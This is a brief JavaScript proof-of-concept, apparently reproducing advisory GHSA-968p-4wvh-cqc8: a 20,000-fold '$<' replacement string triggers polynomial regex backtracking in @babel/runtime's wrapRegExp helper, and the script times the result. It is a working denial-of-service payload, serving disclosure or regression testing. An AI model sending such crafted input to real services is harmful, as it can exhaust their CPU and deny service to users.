// GHSA-968p-4wvh-cqc8: @babel/runtime < 7.26.10 uses /\$<([^>]+)>/g on the
// replacement string inside the wrapRegExp helper -> polynomial backtracking
// when the replacement string is attacker controlled.
const wrapRegExp = require(process.argv[2])
const re = wrapRegExp(/(a)/, { x: 1 })
const substitution = '$<'.repeat(20000)
const start = process.hrtime.bigint()
'a'.replace(re, substitution)
console.log(Number(process.hrtime.bigint() - start) / 1e6)
